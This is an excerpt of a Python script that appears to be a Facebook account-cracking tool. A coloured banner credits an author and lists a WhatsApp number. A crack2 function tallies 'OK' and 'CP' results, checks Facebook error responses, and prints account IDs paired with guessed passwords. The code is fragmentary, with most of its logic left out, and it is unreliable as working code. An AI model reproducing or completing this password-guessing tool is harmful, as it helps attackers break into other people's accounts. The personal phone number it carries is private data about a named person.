...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1m Momin islam
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801812813562
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1m Erorr
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [MOMIN] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [MOMIN-CP] %s|%s        '%(b,idf,pw))
